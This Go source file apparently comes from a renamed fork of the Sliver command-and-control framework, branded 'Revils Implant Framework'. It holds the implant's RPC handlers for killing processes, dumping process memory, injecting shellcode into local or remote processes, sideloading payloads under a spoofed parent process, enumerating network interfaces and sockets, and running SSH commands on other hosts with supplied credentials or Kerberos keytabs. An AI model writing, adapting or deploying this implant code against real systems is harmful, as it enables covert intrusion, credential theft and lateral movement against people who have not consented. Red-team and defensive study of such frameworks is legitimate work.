//go:build linux || darwin || windows

package handlers

/*
	Revils Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"net"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/Kevin-kitnick/revils/implant/revils/netstat"
	"github.com/Kevin-kitnick/revils/implant/revils/procdump"
	"github.com/Kevin-kitnick/revils/implant/revils/ps"
	"github.com/Kevin-kitnick/revils/implant/revils/shell/ssh"
	"github.com/Kevin-kitnick/revils/implant/revils/taskrunner"
	"github.com/Kevin-kitnick/revils/protobuf/commonpb"
	"github.com/Kevin-kitnick/revils/protobuf/revilspb"

	"google.golang.org/protobuf/proto"
)

// ------------------------------------------------------------------------------------------
// These are generic handlers (as in calling convention) that use platform specific code
// ------------------------------------------------------------------------------------------
func terminateHandler(data []byte, resp RPCResponse) {

	terminateReq := &revilspb.TerminateReq{}
	err := proto.Unmarshal(data, terminateReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	var errStr string
	if int(terminateReq.Pid) <= 1 && !terminateReq.Force {
		errStr = "Cowardly refusing to terminate process without force"
	} else {
		err = ps.Kill(int(terminateReq.Pid))
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Failed to kill process %s", err)
			// {{end}}
			errStr = err.Error()
		}
	}

	data, err = proto.Marshal(&revilspb.Terminate{
		Pid: terminateReq.Pid,
		Response: &commonpb.Response{
			Err: errStr,
		},
	})
	resp(data, err)
}

func dumpHandler(data []byte, resp RPCResponse) {
	procDumpReq := &revilspb.ProcessDumpReq{}
	err := proto.Unmarshal(data, procDumpReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	res, err := procdump.DumpProcess(procDumpReq.Pid)
	dumpResp := &revilspb.ProcessDump{Data: res.Data()}
	if err != nil {
		dumpResp.Response = &commonpb.Response{
			Err: fmt.Sprintf("%v", err),
		}
	}
	data, err = proto.Marshal(dumpResp)
	resp(data, err)
}

func taskHandler(data []byte, resp RPCResponse) {
	var err error
	task := &revilspb.TaskReq{}
	err = proto.Unmarshal(data, task)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	if task.Pid == 0 {
		err = taskrunner.LocalTask(task.Data, task.RWXPages)
	} else {
		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
	}
	resp([]byte{}, err)
}

func sideloadHandler(data []byte, resp RPCResponse) {
	sideloadReq := &revilspb.SideloadReq{}
	err := proto.Unmarshal(data, sideloadReq)
	if err != nil {
		return
	}
	result, err := taskrunner.Sideload(sideloadReq.GetProcessName(), sideloadReq.GetProcessArgs(), sideloadReq.GetPPid(), sideloadReq.GetData(), sideloadReq.GetArgs(), sideloadReq.Kill)
	errStr := ""
	if err != nil {
		errStr = err.Error()
	}
	sideloadResp := &revilspb.Sideload{
		Result: result,
		Response: &commonpb.Response{
			Err: errStr,
		},
	}
	data, err = proto.Marshal(sideloadResp)
	resp(data, err)
}

func ifconfigHandler(_ []byte, resp RPCResponse) {
	interfaces := ifconfig()
	// {{if .Config.Debug}}
	log.Printf("network interfaces: %#v", interfaces)
	// {{end}}
	data, err := proto.Marshal(interfaces)
	resp(data, err)
}

func ifconfig() *revilspb.Ifconfig {
	netInterfaces, err := net.Interfaces()
	if err != nil {
		return nil
	}

	interfaces := &revilspb.Ifconfig{
		NetInterfaces: []*revilspb.NetInterface{},
	}
	for _, iface := range netInterfaces {
		netIface := &revilspb.NetInterface{
			Index: int32(iface.Index),
			Name:  iface.Name,
		}
		if iface.HardwareAddr != nil {
			netIface.MAC = iface.HardwareAddr.String()
		}
		addresses, err := iface.Addrs()
		if err == nil {
			for _, address := range addresses {
				netIface.IPAddresses = append(netIface.IPAddresses, address.String())
			}
		}
		interfaces.NetInterfaces = append(interfaces.NetInterfaces, netIface)
	}
	return interfaces
}

func netstatHandler(data []byte, resp RPCResponse) {
	netstatReq := &revilspb.NetstsatReq{}
	err := proto.Unmarshal(data, netstatReq)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		//{{end}}
		return
	}

	result := &revilspb.Netstat{}
	entries := make([]*revilspb.SockTabEntry, 0)

	if netstatReq.UDP {
		if netstatReq.IP4 {
			tabs, err := netstat.UDPSocks(netstat.NoopFilter)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("udp", tabs)...)
		}
		if netstatReq.IP6 {
			tabs, err := netstat.UDP6Socks(netstat.NoopFilter)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("udp6", tabs)...)
		}
	}

	if netstatReq.TCP {
		var fn netstat.AcceptFn
		switch {
		case netstatReq.Listening:
			fn = func(s *netstat.SockTabEntry) bool {
				return s.State == netstat.Listen
			}
		default:
			fn = func(s *netstat.SockTabEntry) bool {
				return s.State != netstat.Listen
			}
		}

		if netstatReq.IP4 {
			tabs, err := netstat.TCPSocks(fn)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("tcp", tabs)...)
		}

		if netstatReq.IP6 {
			tabs, err := netstat.TCP6Socks(fn)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("tcp6", tabs)...)
		}
		result.Entries = entries
		data, err := proto.Marshal(result)
		resp(data, err)
	}
}

func buildEntries(proto string, s []netstat.SockTabEntry) []*revilspb.SockTabEntry {
	entries := make([]*revilspb.SockTabEntry, 0)
	for _, e := range s {
		var (
			pid  int32
			exec string
		)
		if e.Process != nil {
			pid = int32(e.Process.Pid)
			exec = e.Process.Name
		}
		entries = append(entries, &revilspb.SockTabEntry{
			LocalAddr: &revilspb.SockTabEntry_SockAddr{
				Ip:   e.LocalAddr.IP.String(),
				Port: uint32(e.LocalAddr.Port),
			},
			RemoteAddr: &revilspb.SockTabEntry_SockAddr{
				Ip:   e.RemoteAddr.IP.String(),
				Port: uint32(e.RemoteAddr.Port),
			},
			SkState: e.State.String(),
			UID:     e.UID,
			Process: &commonpb.Process{
				Pid:        pid,
				Executable: exec,
			},
			Protocol: proto,
		})
	}
	return entries

}

func runSSHCommandHandler(data []byte, resp RPCResponse) {
	commandReq := &revilspb.SSHCommandReq{}
	err := proto.Unmarshal(data, commandReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %s\n", err.Error())
		// {{end}}
		return
	}
	stdout, stderr, err := ssh.RunSSHCommand(commandReq.Hostname,
		uint16(commandReq.Port),
		commandReq.Username,
		commandReq.Password,
		commandReq.PrivKey,
		commandReq.SignedUserCert,
		commandReq.Krb5Conf,
		commandReq.Keytab,
		commandReq.Realm,
		commandReq.Command,
	)
	commandResp := &revilspb.SSHCommand{
		Response: &commonpb.Response{},
		StdOut:   stdout,
		StdErr:   stderr,
	}
	if err != nil {
		commandResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(commandResp)
	resp(data, err)
}
